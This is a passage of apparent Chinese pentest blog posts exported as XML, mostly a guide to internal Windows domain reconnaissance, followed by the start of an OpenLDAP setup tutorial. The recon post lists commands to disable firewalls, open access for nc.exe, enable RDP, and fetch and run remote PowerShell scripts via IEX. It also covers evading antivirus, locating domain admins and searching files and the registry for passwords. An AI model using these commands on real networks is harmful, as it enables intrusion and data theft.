可以参考：http://icir.org/vern/papers/lensing.oak15.pdfhttp://ieeexplore.ieee.org/stamp/stamp.jsp?arnumber=7163026https://www.cnblogs.com/h2zZhou/p/6513238.htmlhttps://www.youtube.com/watch?v=QwAHNnKDVxQhttps://mp.weixin.qq.com/s?__biz=MzI2NjUwNjU4OA==&amp;mid=2247483685&amp;idx=1&amp;sn=8ac38ff22d571bbbf7716cb9e83b9b35&amp;chksm=ea8c5916ddfbd00008d9b28e22fccba8c201ce78c70c2d78d10ee732f22a39ccf46d4b197634&amp;mpshare=1&amp;scene=23&amp;srcid=0831Wr5YJPYzSrQU6gnfGVd0 所有这些方案都不完美各有利弊，最终的策略可能是几种方案的结合使用，形成防御体系，将攻击提前化解在局部，不至于影响整个系统。 实践暂时有待实践 参考(基本是完全参考大佬的，整理的太全了)：https://xz.aliyun.com/t/71https://xz.aliyun.com/t/70 其他链接资源：https://www.freebuf.com/articles/network/76021.htmlhttps://www.cnblogs.com/wuyuan2011woaini/p/5800062.htmlhttps://www.cnblogs.com/micr067/p/12519779.htmlhttps://yq.aliyun.com/articles/480125/ kali下的DDos测试工具 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>DDos</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网第二章-内网基础信息搜集]]></title>
    <url>%2Fposts%2F54461%2F</url>
    <content type="text"><![CDATA[二 . 内网信息收集 本机信息收集 1)查询网络配置 net view # 查看工作组 ipconfig /all # 也可以看到是否有域 2) 查询用户列表 net user # 查看本机用户列表 net localgroup administrators # 本机管理员（通常含有域用户） query user || qwinsta # 查看当前在线用户（提前看看管理员是否在线） # 企事业单位的用户名有规则性 3)查询进程列表 # 看装了什么软件,vpn,杀毒软件,虚拟机,某服务(推敲域内是否都装了这个软件) # 看进程运行的权限 tasklist /v # 或用wmic wmic process list brief 4) 查看本机服务信息 wmic service list brief 5) 查询操作系统及安装软件版本信息 # 获取操作系统和版本信息() systeminfo |findstr /B /C:"OS Name" /C:"OS Version" # 英文版本的话是这样 systeminfo |findstr /B /C:"OS 名称" /C:"OS 版本" # 中文版本的话是这样 # 查看系统体系结构 echo %PROCESSOR_ARCHITECTURE% # amd64 # 查看安装软件和版本、路径等 wmic product get name,version # powershell查看安装软件信息 powershell "Get-WmiObject -class Win32_Product |Select-Object -Property name,version" 6) 查询端口列表 netstat -ano # 根据端口综合判断，如果是内容用来更新的服务器/DNS服务器/代理服务器 7) 查询启动信息 wmic startup get command,caption 8) 查看计划任务 schtasks /query /fo LIST /v 9) 查看主机开机时间 net statistics workstation 10) 列出或断开本地计算机与所连接的客户端之间的会话 net session 11) 查询补丁信息 systeminfo #可以看到很多信息(域内主机补丁是批量打的) # 或用wmic wmic qfe get Caption,Description,HostFixID,InstalledOn 12) 查询本机共享 # 默认是开着C，IPC，ADMINS # 不单单是看本机的信息(通过本机判断域内情况) net share net share \\yourHostname wmic share get name,path,status # wmic： 是windows自带的一个命令工具，有很多功能(交互/非交互模式) 13) 查询路由表和所有可用的ARP缓存表 route print # arp -a 14) 查询防火墙配置 # '查看'防火墙配置 netsh firewall show config ## '关闭'防火墙(msf里面也有) #1.对win server 2003以及之前的版本 netsh firewall set opmode disable #2.win server 2003之后的版本 netsh advfirewall set allprofiles state off # 自定义防火墙日志储存位置 netsh advfirewall set currentprofile logging filename "C:\windows\temp/fw.log" ## '修改'防火墙相关配置(比关闭防火墙动静小，改完记得恢复规则) #1.对win server 2003以及之前的版本,允许指定程序全部连接 netsh firewall add allowprogram c:\nc.exe "allow nc" enable #2.win server 2003之后的版本 允许指定程序连入 netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program="C: \nc.exe" 允许指定程序连出 netsh advfirewall firewall add rule name="Allow nc" dir=out action=allow program="C: \nc.exe" 允许3389端口放行 netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow 15) 查看代理配置情况 reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" 16) 查询并开启远程连接服务（比较老的知识点） ##### 查看远程连接端口 Reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber ###### 开启的3389方法： # 1.通用 开3389(优化后)： wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 # 2.For Win2003: REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f # 或者 wimc path win32_terminalservicesetting where (__CLASS !="") call setallowsconnections 1 # 3.For Win2008: REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f # 4.For Every: cmd开3389 win08 win03 win7 win2012 winxp # win08，三条命令；win2012通用；win7前两条即可(权限需要run as administrator): wmic /namespace:\root\cimv2 erminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1 wmic /namespace:\root\cimv2 erminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f 17) 自动化信息搜集 写一个脚本，把上面要搜集的信息都进行 WMIC(win管理工具命令行)的搜集信息的写好的脚本(执行该脚本后，会自动生成一个html文件) 链接 18) Empire下的主机信息搜集1.Empire提供了用于收集主机信息的模块，输入命令usemodoule situational_awareness/host/winenum即可看到一些信息2.usemodoule situational_awareness/host/computerdetails 包含了几乎所有有用的东西(但是运行这个模块需要管理员权限) 查询当前权限 whoami # 查询当前权限 获取到一台主机的权限后，有如下三种情况： 本地普通用户 本地管理员用户 （可以用来查询域内信息, 比如： net view /xx/yy） 域内用户(域名\用户) 本地管理员权限默认和直接提升为Ntauthority或System权限，因此，在域中，除普通用户外，所有的机器都有一个机器用户(用户名是机器名+$)。本质上，机器的system用户对应的就是域里面的机器用户，所以使用system权限可以运行域内的查询命令 whoami /all # 获取域SID net user xxx /domain # 查询指定用户的详细信息 判断是否存在域 如果存在域，就需要判断所控主机是否在域内 几种方法： # 1. ipconfig /all # 可以查看网关IP地址、DNS的ip地址、域名、本机是否和dns处在同一网段 # 然后，可以通过nslookup反解析域名的ip地址，用解析得到的ip地址进行对比，判断DC和DNS是否在同一台服务器上 # 2.查看系统详细信息(有"域"的字段)，如果"域"为WORKGROUP则表示当前服务器不在域内 systeminfo # 3.查询当前登录域及登录用户信息("工作站域DNS名称"为域名，如果为WORKGROUP则表示当前为非域环境) # "登录域"表示当前登录的用户是域用户还是本地用户 net config workstation # 4.判断主域(域服务器通常会作为时间服务器使用) net time /domain # 三种情况： 1.存在域，当前用户不是域用户 2.存在域，当前用户是域用户 3.当前网络环境为工作组，不存在域 域内存活主机探测 避免除法防病毒软件报警 不要使用暴力的; 不要使用图形化的工具 使用powershell/vbs等自带的 白天上班时间探测一遍，深夜分别探测一遍（对比分析存活主机对应的IP地址i） 1.利用netbios快速探测 （优先使用这个协议,会被认为是正常的通信）工具：nbtbios使用方法 # win和Linux下都有 # 这里用win版本的，上传到目标主机(推荐放到目标机器的windows/temp下面) nbtscan.exe 192.168.111/24 参数说明(结果的第三列)： 2.利用icmp协议快速探测内网工具：1.ping命令: # for循环ping整个网段 for /L %l in (1,1,254) Do @ping -w 1 -n 192.168.111.%l |findstr "TTL=" 2.VBS脚本 没写 # cscript xxx.vbs 运行脚本 3.利用arp扫描完整探测内网工具：1.arp-scan # 上传arp.exe 到目标机器运行 Arp.exe -t 192.168.0/20 2.Empire中的arpscan模块 usemodule situational_awareness/net/work/arpscan set ... execute 3.NiShang里面的脚本: Invoke-ARPScan.ps1 # a.远程下载运行 powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.1/Invoke-ARPScan.ps1');Invoke-ARPScan -CIDR 192.168.1.0/20" >> C:\windows\temp\log.txt # b.本地运行(先上传脚本到目标) powershell.exe -nop -exec bypass -Command "&amp;{Import-Module C:\windows\temp\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/20}" >> C:\windows\temp\log.txt # c.无条件运行(没痕迹) 3.利用常规tcp/udp端口扫描探测内网工具：scanline (比较老, 但是好用，可在所有win版本使用，动静小) # -t 是tcp端口， -u是udp端口 sl -h -t 22,80-89,110,389,445,3389,1099,1433,6379,27017,7001,8080,1521,3306,5432 -u 53,161,137,139 -O c:\windows\temp\sl_res.txt -p 192.168.1.1-254 /b 扫描域内端口 通过端口，不仅能了解目标主机所开放的服务，还能找出其开放服务的漏洞、分析目标网络的拓扑结构等 端口的banner信息 端口上运行的服务 常见应用的默认端口 工具： 1.telent命令(针对单个，肯定不会触发报警)telnet DC1 22 # 查看某台主机某个端口是否开放 2.S扫描器# 早期的工具，支持大网段 S.exe TCP 192.168.1.1 192.168.1.112 22,445,3389,1433,6379,8080,80,23,21,25,110,3306,1521,111,445,7001 256 /Banner /save # 结果默认保存在安装目录下的result.txt文件中 3.Metasploit内置的端口扫描模块:search portscan use auxiliary/scanner/portscan/tcp # 还有其他模块 set ... run 4.PowerSploit下的Invoke-portscan.ps1脚本 (不会下载到本地)powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1');Invoke-portscan -Hosts 192.168.1.0/24 -T 4 -ports '445,1433,5432,8080,3389,22' -oA C:\windows\temp\log.txt" 5.NiShang的Invoke-PortScan模块Get-Help Invoke-PortScan -full # ResolveHost 解析主机名 Invoke-PortScan -StartAddress 192.168.0.1 -StopAddress 192.168.0.255 -ResolveHost 6.nmap 7.masscan 8.其他端口扫描工具 注意扫描是否会触发IDS等设备 端口Banner信息 通过扫描发现了端口，可以使用客户端连接工具或nc，获取服务端的Banner信息 获取Banner信息之后，可以在漏洞库中查找相应的CVE编号的POC/Exp, 在Exploit-DB、Seebug、安全焦点的BugTraq 等平台查看相关漏洞利用工具，然后到目标系统中验证漏洞是否存在，从而有针对性地进行安全加固 常见端口机器攻击方向：链接 收集域内基础信息 # 域用户才有权限进行以下查询（本机的system权限也可以，机器的用户名+$） # 查询域 net view /domain # 查询域内所有计算机(可通过主机名对主机角色进行初步判定, 比如web可能是web服务器) net view /domain:domainName net view /domain:WORKGROUP # 查看域内所有用户组 net group /domain # 查看域成员计算机列表 net group "domain computers" /domain # 获取域密码信息(密码策略,密码长度,错误锁定等信息) net accounts /domain # 获取域信任信息 nltest /domain_trusts 查找 域控制器(DC) # 查看DC的机器名 nltest /DCLIST:xxx # 查看DC的主机名 nslookup -type=SRV _ldap._tcp # 查看当前时间 net time /domain # 查看域控制器组 net group "Domain Controllers"/domain netdom query pdc 域内用户和管理员的获取 1.查询所有域用户列表： net user /doamin # 向DC进行查询域用户列表 wmic useraccount get /all # 获取域内用户详细信息 dsquery user # 查看存在的用户 # 常用的dsquery命令 dsquery computer # 查找目录中的计算机 dsquery contact # 查找目录中的联系人 dsquery subnet # 查找目录中的子网 dsquery group # 查找目录中的组 dsquery ou # 查找目录中的组织单位 dsquery site # 查找目录中的站点 dsquery user # 查找目录中的用户 dsquery quota # 查找目录中的配额规定 dsquery partition # 查找目录中的分区 dsquery * - # 用通用的 LDAP 查询来查找目录中的任何对象 net localgroup administrators # 查询本地管理员组用户(实际中，为了方便管理，会有域用户被设置为域机器的本地管理员用户) 2.查询域管理员用户组 # 查询域管理员用户 net group "doamin admins" /domain # 查询域管理员用户组 net group "Enterprise Admins" /domain 定位域管理员 (很重要) 当一台机器加入域后，会默认给域管理员组赋予本地系统管理员权限 常规定位域内管理员方法： 第二种方法使用较多 日志 （本地机器的管理员日志，可以使用脚本或wevtutil导出并查看） 会话 （域内每个机器的等会会话，可以匿名查询，无需权限，可以使用netess.exe或powerview等工具查询） 常用的定位域管理员工具：1.psloggedon.exe # 下载地址：https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon # 查看本地登录的用户 和 通过本地计算机或远程计算机的资源登录的用户 # 如果指定的是"用户名"而不是计算机名，则会搜索网上邻居的计算机，并显示该用户当前是否已经登录 # 某些功能需要管理员权限 psloggedon \\DC1 # - 显示支持的选项和用于输出值的单位 # -l 仅显示本地登录，不显示本地和网络资源登录 # -x 不显示登录时间 # \\computername: 指定要列出登录信息的计算机name # username: 指定用户名 2.PVEFindADUser.exe # 下载地址： https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn # 可用于查找活动目录 # 需要 .net 2.0, 且 需管理员权限 PVEFindADUser.exe &lt;参数> # PVEFindADUser.exe --current # 显示域中所有计算机上当前登录的用户 PVEFindADUser.exe --last # 显示域中目标计算机上最后登录的用户 # 参数 -noping 阻止在之前ping 4.netsess.exe # 枚举工具 netsess.exe &lt;参数> # -f file.txt 指定要提取主机列表的文件 # -e file.txt 指定要排除的主机名的文件 # -o file.txt 将所有输出都重定向到指定的文件 # -d domain 指定要提取主机列表的域，若没指定，则从当前域中提取主机列表 # -g group 指定搜索的组名，若没指定，就从当前域中提取主机列表 # -c 对已找到的共享目录/文件的访问权限进行检查 5.NetView.exe # 地址： https://github.com/mubix/netview 6.Nmap的NSE脚本 # 下载地址 https://nmap.org/nsedoc/scripts/smb-enum-sessions.html smb-enum-session.nse # 获取远程机器的登录会话,查看当前是否有用户登录 smb-enum-domains.nse # 获取主机信息、用户、可使用密码策略的用户等 smb-enum-users.nse # 如果获得的权限有限，使用这个获得更多的域用户的信息 smb-enum-shares.nse # 遍历远程主机的共享目录 smb-enum-processs.nse # 对主机的系统进程进行遍历（可以知道主机正在运行什么软件） smb-os-discovery.nse # 收集目标的一些信息 7.PowerShell 中， PowerView脚本： Invoke-UserHunter # 下载地址： https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView # Invoke-StealthUserHunter 只需要进行一次查询，就可以获取域里面的所有用户(隐蔽性高，但不一定全面) # Invoke-UserHunter 找到域内特定的用户群，接收用户名、用户列表和域组查询 powershell -nop -exec bypass -Command "&amp; {Import-Module .\PowerView.ps1; Invoke-UserHunter}" 8.Empire下user_hunter模块 # 也有类似Invoke-UserHunter的模块： user_hunter --> 用于查找域管理员登录的机器 usemodule situational_awareness/network/powerview/user_hunter 查找域管理进程 如果在无法立即拥有权限的系统中获得管理员进程，那么通常可以采用的方法是：在跳板机之间跳转，直至获得域管理员权限，同时进行一些分析工作，进而找到测试的路径 a.本机检查1．获取域管理员列表 net group "domain admins" /domain 2．列出本机所有进程及进程用户 tasklist /v 3．寻找是否有进程所有者为域管理员的进程能用上面两种方法找到自然最好，但实际往往并非如此…… b.查询域控制器的与用户会话（脚本） 收集域控制器的列表# 可以使用LDAP查询 # net net group "domain Controllers" /domain 收集域管理员的列表net group "domain Admins" /domain 收集所有活动域会话的列表 # 使用Netsess.exe插叙每个域控制器， netsess -h 将域管理员列表与活动会话列表交叉引用，以确定哪些IP地址具有活动域令牌# #也有其他的的GDA脚本(Get Domain Admins) https://github.com/nullbind/Other-Projects/tree/master/GDA 如果没有会话： 隔一段时间，等着有会话 / 脚本自动隔一段时间运行 c.扫描远程系统上运行的任务前提：使用了共享 d.扫描远程系统上NetBISO信息NetBISO是一个协议，端口137,138,139之类也可使用工具：nbtscan 模拟域管理员的方法如果已经拥有了meterpreter会话，就可以使用Incognito来模拟域管理者添加一个域管理员，通过尝试遍历系统中所有可用的授权令牌来添加新的管理员第四章见 利用 PowerShell 收集域信息PowerShellPowerShell常用的执行权限共有四种，具体如下。 Restricted：默认设置，不允许执行任何脚本。 Allsigned：只能运行经过证书验证的脚本。 Unrestricted：权限最高，可以执行任意脚本。 RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名。 在 PowerShell 中输入“Get-ExecutionPolicy”，看到为默认 Restricted 权限 PowerView 是一款依赖 PowerShell 和 WMI 对内网域情况进行查询的常用渗透脚本，PowerView 集成在PowerSploit 工具包中下载地址 BypassUAC 最直接的办法： -ExexutionPolicy ByPass PowerView 中的常用命令 # 先 Import-Moudle .\PowerView.ps1 Get-NetDomain #获取当前用户所在的域名称 Get-NetUser #返回所有用户的详细信息 Get-NetDomainController #获取所有域控制器 Get-NetComputer #获取所有域内机器的详细信息 Get-NetOU #获取域中的 OU 信息 Get-NetGroup #获取所有域内组和组成员信息 Get-NetFileServer #根据 SPN 获取当前域使用的文件服务器 Get-NetShare #获取当前域内所有网络共享 Get-NetSession #获取在指定服务器存在的会话信息 Get-NetRDPSession # 获取在指定服务器存在的远程连接信息 Get-NetProcess #获取远程主机的进程信息 Get-UserEvent #获取指定用户的日志信息 Get-ADObject #获取活动目录的对象信息 Get-NetGPO #获取域所有组策略对象 Get-DomainPolicy # 获取域默认或域控制器策略 Invoke-UserHunter #用于获取域用户登录计算机及该用户是否有本地管理权限 Invoke-ProcessHunter #查找域内所有机器进程用于找到某特定用户 Invoke-UserEventHunter #根据用户日志获取某域用户登录过哪些域机器 域分析工具 BloodHound 通过图与线的方式，把域内信息直观的展示 https://github.com/BloodHoundAD/BloodHound/releases/download/2.0.4/BloodHound-win32-x64.zip 配置环境1.下载安装jdk并配置2.下载安装Neo4j（Neo4j Server -&gt; Community Server-&gt;Windows）3.启动Neo4j数据库服务端(neo4j-&gt;非关系型数据库. 进入解压后的bin，输入命令ndo4j.bat console启动服务)4.浏览器输入：127.0.0.1:7474/browser，用户名密码默认neo4j4.下载BloodHound, 解压后双击exe启动， 输入bolt://localhost:7687和账户密码，就安装好了 使用主界面按钮和选项描述：…… 采集数据 哪些用户登录了哪些机器 哪些用户拥有管理员权限 那些用户和组属于哪些组 BloodHound采集需依赖PowerView.ps1的BloodHound：BloodHound分为两部分： 1.PowerShell采集器脚本(SharpHound.ps1) 2.可执行文件SharpHound.exe # 使用SharpHound.exe采集域内信息 把SharpHound.exe复制到目标机器 sh.exe -c all 导入数据在当前目录下，会生成xxx_BloodHound.zip`压缩包可以把压缩文件放到界面上节点信息以外的任意位置 查询信息主界面左上角的查询Queries, 进入模块，可以看到预定义的常用查询条件 按住ctrl键，可以循环显示； 在其图标上按住鼠标左键可以移动位置 敏感数据的防护 价值比较高的东西基本上是全部在内网的 资料/数据/文件的定位流程 定位内部人事组织结构。 在内部人事组织中寻找需要监视的相关人员。 定位相关人员的机器。 监视相关人工作时存放文档的位置。 列出存放文档服务器的目录。 定位内部人事组织结构1. 人事组织结构图类似公司结构图可以在目标的外部站点(类如首页“关于我们” )和网上暴露的信息(类如发表在招聘网的各类岗位名称)来分析,或者在内网电脑中寻找类似的人事组织结构图, 再结合分析人事资料里相关员工资料与域内用户名或者用户组的对应 关系, 可以很快定位到你需要寻找的人员使用的机器 2. 人力资源主管个人电脑在内网中通过上述种种方法定位到人力资源主管个人机器,通常单位人力资源主管电脑中会存在公司所有人员的身份信息及相关材料,寻找到人力资源主管个人机器后在其电脑中寻找公司人力资源相关文档得存放位置,然后从人力资源文档中寻找公司相关人员信息,直至收集到你所需要的材料。 net group /domain可以查询域内所有用户组的信息, 同样可以利用该命令来定位公司内部人事结构除了内置重点组外, 自建的域组需要特别关注(1)IT组/研发组: 他们掌握了大量的内网密码,数据库密码等。 (2)秘书组: 他们掌握着大量的目标机构的内部传达文件和资料,为信息分析业务提供信息。 (3)财务组: 他们掌握着目标机构大量的资金往来与目标企业的规划发展,并且可以通过资金表,来判断出目标组织的整体架构。 (4)CXX组: 如ceo cto coo等,不同的组织名字不同,如部长、厂长、经理等,会拥有目标机构的机密信息 重点核心业务机器及敏感信息防护 重点核心业务机器是渗透测试人员通常比较关心的机器,因此需要做好相应的防护措施。 1.核心业务机器 - 高管/系统管理员/财务/人事/业务人员的个人计算机。 - 产品管理系统服务器(仓库管理系统) - OA 办公系统服务器。 - 财务应用系统服务器。 - 核心产品源码服务器(对于 IT 公司,会架设自己的 SVN 或者 GIT 服务器) - 数据库服务器。 - 文件服务器/共享服务器。 - 邮件服务器。 - 网络监控系统服务器。 - 其他服务器(分公司、工厂) 2.各类敏感文件信息 - 站点源码备份文件、数据库备份文件、配置文件备份等(后缀 XX.zip,XX.sql 等) - 各类数据库的 Web 管理入口,如 phpmyadmin、adminer 等。 - 浏览器密码和浏览器 cookie(IE、Chrome、Firefox) - 其他用户会话、3389 和 ipc$连接记录、各用户回收站的信息等。 - Windows 无线密码。 - 目标内部的各种账号和密码信息,包括邮箱、VPN、FTP、TeamView 等。 应用与文件形式的信息收集说白了就是翻文件（包括一些应用的配置文件、敏感文件、密码、远程连接、员工账号、电子邮箱等） 不管什么途径获得的内网机器,首先需要知道的就是这台机器所属人员的职位、权利,通常一个高权利的人他在内网的权限比一般员工要高很多,他的电脑内也会有很多重要的、敏感的个人或公司内部文件。 用户在内网中工作时,建议不要将一些特别重要的资料放在公开的计算机中,必要时一定要对 Office 文档进行加密,密码也不要太过于简单 常用搜索：1.搜索指定含有任意多关键字的文件名 dir c:\*.doc /s dir /b/s password.txt dir /b/s config.*dir /s *pass* == *cred* == *vnc* ==*.config* 2.搜索文件名为password.txt/xml/ini的文件,这个操作可能造成大量的输出 findstr /si password *.xml *.ini *.txt 3.搜索带有关键词的注册表项,下例中是查询的关键词是 “password”的命令 reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s 4.对于加密office办公软件 如果是低版本如2003的话,可以在百度搜一些网上的破解软件进行破解。 如果是高版本的话,可以在目标用户打开文件时使用微软SysinternalsSuite套装中 的抓取dump的工具-procdump来抓取内存dump,然后用内存查看器直接查看文件内容。 分析域内网段划分情况及拓扑结构 目标主机基本架构的判断常见的 Web 架构： - ASP + Access + IIS 5.0/6.0 + Windows Sever 2003 - ASPX + MSSQL + IIS 7.0/7.5 + Windows Sever 2008 - PHP + MySQL + IIS - PHP + MySQL + Apache - PHP + MySQL + Ngnix - JSP + MySQL + Ngnix - JSP + MSSQL + Tomcat - JSP + Oracle + Tomcat 域内网段划分信息内网的环境判断,首先需要分析下内网IP分布情况,一般可以通过内网中路由器、交换机等设备、snmp、弱口令等来获取内网网络拓扑或DNS域传送信息泄漏,另外一般大公司都会有内部网站,也可通过内部网站公开内容链接找出部门ip段。 分析出内部网络是怎么划分的?是按照部门划分的网络段?还是按照楼层?还是按照地区?通常内网可分为DMZ区、办公区和核心区(生产区),了解整个内网的网络分布和组成,也有助于我们寻找内网核心业务。 1.DMZ 区 在实际的渗透测试中,大多数情况下,在外围 Web 中拿到的权限在 DMZ 区。这个区域不属 于严格意义上的内网。如果 DMZ 区域访问控制策略配置合理,DMZ 区会处在内网区能够访问 DMZ 区而 DMZ 区访问不了内网区的情况下,相关知识在第 1 章中已经详细讲解过,此处不再重 复。 2.办公区 办公区,顾名思义,是指公司员工日常的工作区。办公区的安全防护水平一般不是高,基本 防护机制大多为杀毒软件或主机入侵检测产品。在实际应用中,攻击者在获取权限后,利用内网 信任关系,很容易扩大攻击面。一般情况下,攻击者很少会直接到达办公区。攻击者如果想进入 办公区,可能会使用鱼叉攻击、水坑攻击或者社会工程学等手段。 办公区按照系统可分为： OA 系统、邮件系统、财务系统、文件共享系统、域控、企业版杀毒 系统、内部应用监控系统、运维管理系统等,按照网络段可分为域管理网段、内部服务器系统网 段、各部门分区网段等。 按照网络段可分为:域管理网段、内部服务器系统网段、各部门分区网段等。 3.核心区 核心区一般存放企业最重要的数据、文档等信息资产,如域控制器、核心生产机器等,安全 设置也最为严格。根据目标开展的业务不同,相关服务器可能存在于不同的网段上。通过分析服 务器上运行的服务和进程,可以推断出目标主机使用的运维监控管理系统和安全防护系。在内网 中横向移动时,会优先查找这些主机。 核心区按照系统可分为业务系统、运维监控系 按照网络段可分为:各不同的业务网段、运维监控网段、安全管理网段等。 多层域结构分析我们需要先分析出当前内网是否存在多层域、现在这计算机所在的域是几级子域、这个子域的域控制器及根域的域控制器是哪些、其他域的域控制器是哪些、域之间是否存在域信任关系等。 绘制内网拓扑图 基础信息搜集- 思维图 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>信息搜集</tag>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-LDAP]]></title>
    <url>%2Fposts%2F45429%2F</url>
    <content type="text"><![CDATA[LDAP 看书前先看目录 理解不同于文件系统的目录(D/d) -&gt; 首字母大写是目录服务，首字母小写的文件系统目录 目录服务是企业网络的核心基础结构 - 如此重要的服务并不被大多数熟悉 - 很少独立使用，与其他服务结合使用 - 微软的企业战略（埋坑: 一旦底层用了微软的AD,你以后的一些肯定也要用我的集成的产品） - 类似: 每一本书都有自己的目录 数据集中存储的应用需求 - 集中存储、集中管理、集中定位 - 身份认证、公钥分发、邮件路由、地址查询、应用配置、单点登录(SSO -&gt; 只登录一次就不用重复登录了) - 面向大量频繁的数据查询操作，少量写操作（基本不变的数据） - 权限限制授权用户查询 我是否应该使用目录服务(根据自己公司情况) - 用户认证 - 机器认证 - 用户和组 - 电话地址薄 - 组织呈现 - 资产跟踪 - 集中应用配置 - PEX / 网络设备配置 DAP软件架构 不同与SQL的后端层级化数据库（主要面向查询操作） 与DNS的分布式结构更接近，命名上通常与DBS命名保持一致(在目录服务内所有存储对象都有唯一的路径名称) 数据库基于键值对的方式存储数据 标准统一的服务前端应用查询访问接口(基于OSI协议栈, X.500) 统一的客户端查询组件和协议(C/S) 支持通信会话加密 Directory information tree (DIT) 与自建数据库开发相比 专门针对查询服务的数据库结构类型 统一标准的查询结构以及通信协议（DAP -&gt;目录访问协议） LDAP Lightweight Directoy Access Protocol 轻量目录访问服务 命名上通常与DBS命名保持一致(在目录服务内所有存储对象都有唯一的路径名称) 数据库基于键值对的方式存储数据 X.500标准的部分特性集, 各厂商不同 基于TCP/IP协议通信(TCP 389) 可构建面向互联网和本地网络的目录服务 最常见的LDAP服务 # 微软的活动目录 AD 企业网络资源全部加入域，统一存储、统一呈现、统一管理、安全边界 # Novell eDirectory 命名空间 # 全局路径： Distinguished Name (DN) # 相对路径： Relative Distinguished # 目录容器： Directory Container (DC) 每一层 # 组织单位: Organisation Unit (OU) 通常按照部门划分 # 数据项： entries (object, class) 一组预先定义的属性集合 uid, 姓，名，帐号，邮箱，电话, 照片... # 基础架构：Schema objectClass 定义所有对象类型及其属性 Schame 可按应用需要扩展(美国对象在ASN.1结构中都有自己的位置 -- SNMP) # 通用名： common name (CN) 传统命名空间 无固定的命名规则 按照地理空间命名 # 写法 uid=babs, ou=People, dc=example, dc=com LDAP协议LDAP最初作为TCP/IP客户udan与X.500目录服务网关之间发通信协议LDAPv3: 强身份认证和数据加密 基于证书的SSL加密 使用Unicode编码实现国际化 Schema可扩展 安装并配置LDAP 拿出一台服务器作为专门的LDAP的服务器，以后的身份认证都使用集中的LDAP的(不局限与操作系统，Web应用也可以，只要程序支持ldap就可以使用这个做身份认证) 先修改主机名： sudo sed -i 's/preserve_hostname:false /preserve_hostname:true /g' /etc/cloud/cloud.cfg echo "192.168.0.104 ldap.lab.com" | sudo tee -a /etc/hosts # ip地址与名称的解析关系 # 修改主机名 sudo hostnamectl set-hostname ldap.lab.com reboot 安装 OpenLDAP # Ubuntu Linux中默认的LDAP实现 sudo apt install slapd ldap-utils # slapd 是服务端和后台进程(即LDAP server) # ldap-utils （ldap工具） ldapadd # 添加数据 ldapdelete # 删除数据 ldapmodify # 修改 ldapsearch # 查询（最常使用） ldappasswd # 修改密码 ... ... 修改配置文件 # sudo vim /etc/ldap/ldap.conf BASE dc=lab,dc=com # 目前和dns的域名保持一直即可 URI ldap://ldap.lab.com:389 # 可以通过这个地址对..进行查询 初始化配置 # 一次就够了!!! sudo dpkg-reconfigure slapd # 还可以设置一次密码 # 数据库建议选择MDB 验证 # 多种验证方式 sudo slapcat sudo tree /etc/ldap/slapd.d/ # 有内容就可 # 默认管理员帐号 admin ldapsearch -x -LLL -b dc=lab,dc=com ldapsearch -x -LLL -b dc=lab,dc=com dn # 后面的内容是筛选 # -x 简单身份验证 # -LLL 以标准LDIF文件格式显示结果 # -b 基地址 向目录中添加记录保存信息 # 保存信息到文件 # vim add.ldif # ou: 物理的层级结构划分 dn: ou=People,dc=lab,dc=com objectClass: organizationalUnit ou: People # 物理的 dn: ou=Group,dc=lab,dc=com # ou的名称叫Group, 一个对象只能在一个ou中, ou是物理上的 objectClass: organizationalUnit ou: Group # 逻辑的 # 组帐号s dn: cn=delevopment,ou=Group,dc=lab,dc=com # 创建一个组，cn别名 objectClass: organizationalUnit cn: delevopment gidNumber: 3000 # 用户帐号 dn: uid=zhangsan,ou=People,dc=lab,dc=com # 创建一个组，cn别名 objectClass: inetOrgPerson # 继承某些对象类型 objectClass: posixAccount objectClass: shadowAccount uid: zhangsan sn: zhang givenName: san cn: san zhang # 别名 displayName: San Zhang uidNumber: 2000 gidNumber: 3000 # 让用户加入某个组 userPassword: 123465 loginShell: /bin/bash homeDirectory: /home/zhangsan/ 导入： ldapadd -x -D cn=admin,dc=lab,dc=com -W -f add.ldif # -x 简单身份验证 # -D 